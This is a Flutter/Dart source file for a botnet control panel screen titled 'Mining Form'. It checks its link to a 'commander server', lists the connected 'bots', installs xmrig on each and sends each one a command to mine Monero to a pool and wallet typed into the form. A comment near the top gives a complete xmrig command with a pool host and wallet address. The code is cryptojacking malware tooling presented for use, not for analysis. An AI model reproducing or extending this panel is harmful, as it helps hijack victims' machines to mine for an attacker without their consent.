import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/src/widgets/framework.dart';
import 'package:flutter/src/widgets/placeholder.dart';
import 'package:http/http.dart' as http;
import 'package:web/screens/homeScreen.dart';
import 'package:web/widgets/MainScreenWidget.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:web_socket_channel/status.dart' as status;

// monero/xmrig.exe -o stratum+tcp://multi-pools.com:3032 -u 49r8caVjXGgBBAYaQvKq3yDaFGU3JFNk5TBCYbLRTcjh67cGi9uFcUPGBf8pZCs8X64hySgV7ZjpkSzU2kG5gCyRTjp22kG -p 1

class MiningScreen extends StatefulWidget {
  static String router = "mining";
  const MiningScreen({super.key});

  @override
  State<MiningScreen> createState() => _MiningScreenState();
}

class _MiningScreenState extends State<MiningScreen> {
  final formkey = GlobalKey<FormState>();
  WebSocketChannel? channel;
  bool _disconnected = true;


  Map<String, dynamic> data = {};
  TextEditingController _commandController = TextEditingController();
  TextEditingController _numBotsController = TextEditingController();
  TextEditingController _outputController = TextEditingController();

   void connectTowebsocket() async {

    try {

    
    channel = WebSocketChannel.connect(Uri.parse('ws://localhost:1300'));

  
      
      channel!.stream.listen((data) {
        if (data == "Connected#0&") {
          setState(() {
            _disconnected = false;
          });
        } else {
        setState(() {
          _outputController.text = _outputController.text + data;
        });

        }
      }, 
    
      onDone: () {
        print("the connection done > try to reconnect");
        handelDisconnection();
      }, onError: (error) {
        print("error in connection > try to reconnect");
        handelDisconnection();
      });
    } catch (err) {
      print(err);
      handelDisconnection();
    }
   

  }

  void handelDisconnection() {
      setState(() {
        _disconnected = true; // We are now disconnected
      });

      Future.delayed(Duration(milliseconds: 5000), () {
        if (_disconnected) {
          connectTowebsocket();
        }
      });
    
  }

  @override
  void initState() {
    super.initState();
    connectTowebsocket();
  }

  @override
  void dispose() {
    channel?.sink.close();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return MainScreenWidget(body: [
     
      SizedBox(
        height: 100,
      ),
      SingleChildScrollView(
        child: ConstrainedBox(
                    constraints: BoxConstraints(maxWidth: 800), // Set the max width here

          child: Container(
            color: Colors.black,
            child: Padding(
              padding: EdgeInsets.all(16),
              child: Form(
                key: formkey,
                child: Column(children: [
                  Text(
                    "Mining Form ⛏️",
                    style: Theme.of(context).textTheme.headlineMedium,
                  ),
        
                  Container(
                    margin: EdgeInsets.all(20),
                    child: Padding(
                      padding: EdgeInsets.all(10),
                      child: _disconnected
                          ? 
                              Text(
                                  "The website is not connected to the commander server ❌")
                            
                          : Text(
                              "The website is connected to the commander server ✅"),
                    ),
                    decoration: BoxDecoration(
                        borderRadius: BorderRadius.all(Radius.circular(10)),
                        color: _disconnected ? Colors.red : Colors.green),
                  ),
                  TextFormField(
                    // controller: ,
                    decoration: InputDecoration(labelText: "URL of Pool :", helperText: "For example: stratum+tcp://...org:port"),
                    validator: (val) {
                      if (val != null && val != "") {
                        data["pool"] = val;
                      } else {
                        return "valide pool";
                      }
                    },
                  ),
                  const SizedBox(
                    height: 16,
                  ),
                  // TextFormField(
                  //   // controller: ,
                  //   decoration: InputDecoration(labelText: "Password :"),
                  //   validator: (val) {
                  //     if (val != null && val != "") {
                  //       data["password"] = val;
                  //     } else {
                  //       return "valide password";
                  //     }
                  //   },
                  //                     style: TextStyle(color: Colors.black),
                  // ),
                  // const SizedBox(
                  //   height: 16,
                  // ),
                  TextFormField(
                    // controller: ,                    
                    decoration:
                        InputDecoration(labelText: "Wallet Address", helperText: "add you wallet address (monero)"),
                    validator: (val) {
                      if (val != null && val != "") {
                        data["url"] = val;
                      } else {
                        return "valide url";
                      }
                    },
                  ),
                  const SizedBox(
                    height: 40,
                  ),
                  Text(
                    "Bots Optomizition",
                    style: Theme.of(context).textTheme.headlineSmall,
                  ),
                  const SizedBox(
                    height: 16,
                  ),
                  TextField(
                    controller: _numBotsController,
                    keyboardType: TextInputType.number,
                    decoration: InputDecoration(labelText: "Number of Bots:"),
                  ),
                  SizedBox(
                    height: 16,
                  ),
                  Row(
                    children: [
                      ElevatedButton(
                        onPressed: () async {
                          if (formkey.currentState!.validate()) {
                            _outputController.text = "";
                            String command = Uri.encodeQueryComponent(
                                "stream::.\\monero\\xmrig.exe -o ${data['pool']} -u ${data['url']} -p 1 --coin monero");
                            int botsNum =
                                int.tryParse(_numBotsController.text) ?? 0;
        
                            if (command != "" && botsNum != 0 && botsNum < 11) {
                              final response1 = await http.get(Uri.parse(
                                  "http://localhost:8080/api/s/clients"));
                              List connectedBots = json.decode(response1.body);
                              int i = 0;
                              print(connectedBots);
                              for (var botId in connectedBots) {
                                i += 1;
                                var response2 = await http.post(Uri.parse(
                                    "http://localhost:8080/install?tool=monero&id=$botId"));
                                print(response2.statusCode);
                                print(response2.body.toString());
                                if (response2.statusCode == 200) {
                                  print(command);
                                  var response3 = await http.get(Uri.parse(
                                      "http://localhost:8080/stream_command?command=$command&id=$botId"));
                                  // response2.body
        
                                  // _outputController.text = _outputController.text +
                                  //     """
                                  //             ~~~~~~~~~~~~~~~~~~~~~~~ Device $i ~~~~~~~~~~~~~~~~~~~~~~~
        
                                  //             ${response3.body}
        
                                  //             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        
                                  //             """;
                                } else {
                                  _outputController.text =
                                      "Something wrong with $botId device";
                                }
                              }
                            }
                          }
                        },
                        child: Text("Send Task"),
                      ),
                      const SizedBox(
                        width: 100,
                      ),
                      ElevatedButton(
                        style: ButtonStyle(
                            backgroundColor:
                                MaterialStateProperty.all(Colors.red)),
                        onPressed: () async {
                          if (formkey.currentState!.validate()) {
                            String command =
                                Uri.encodeQueryComponent("stream::endTask#0&");
                            int botsNum =
                                int.tryParse(_numBotsController.text) ?? 0;
        
                            final response1 = await http.get(
                                Uri.parse("http://localhost:8080/api/s/clients"));
                            List connectedBots = json.decode(response1.body);
                            int i = 0;
                            print(connectedBots);
                            for (var botId in connectedBots) {
                              i += 1;
        
                              print(command);
                              var response3 = await http.get(Uri.parse(
                                  "http://localhost:8080/stream_command?command=$command&id=$botId"));
                            }
                          }
                        },
                        child: Text("End Task"),
                      ),
                    ],
                  ),
        
                  const SizedBox(
                    height: 16,
                  ),

                ]),
              ),
            ),
          ),
        ),
      ),
        Padding(
          padding: const EdgeInsets.all(10),
          child: Container(
            padding: EdgeInsets.all(10),
            color: Colors.black,

            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text("The Result Here 👇",  style: Theme.of(context).textTheme.headlineMedium!.copyWith(color: Colors.green ),),
                SizedBox(height: 10,),
                TextField(
                  
                            controller: _outputController,
                            readOnly: true,
                            maxLines: null,
                            decoration:
                                const InputDecoration(border: OutlineInputBorder()),
                            style: TextStyle(color: Colors.green),
                          ),
              ],
            ),
          ),
        )
    ]);
  }
}
